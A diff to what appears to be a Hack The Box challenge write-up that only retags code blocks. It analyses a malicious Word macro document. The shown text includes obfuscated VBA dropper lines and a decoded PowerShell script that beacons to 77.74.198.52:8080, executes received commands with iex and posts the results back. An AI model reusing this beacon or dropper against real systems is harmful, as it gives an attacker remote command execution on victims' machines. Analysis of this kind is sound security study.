@@ -2,7 +2,7 @@
 
 The challenge starts with a Macro Word Document `.docm`. The macro contains obfuscated code that writes the base64 encoded payload into a file, then read the payload from that file to execute it via powershell:
 
-```
+```vba
 Set dfdjqgaqhvxxi = rxnnvnfqufrzqfhnff.CreateTextFile(dropPath & uxdufnkjlialsyp("5c68697374") & uxdufnkjlialsyp("6f72792e62616b"), True)
 dfdjqgaqhvxxi.Write bnhupraoau
 [...]
@@ -24,7 +24,7 @@ AcwAvADcAZQBhADIAMwBhADIAYwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGU
 
 And decoding it, we get:
 
-```
+```bash
 $ base64 -d < output.txt
 $s='77.74.198.52:8080';$i='d43bcc6d-043f2409-7ea23a2c';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/d43bcc6d -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/043f2409 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/7ea23a2c -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}HTB{5up3r_345y_m4cr05}%
 ```
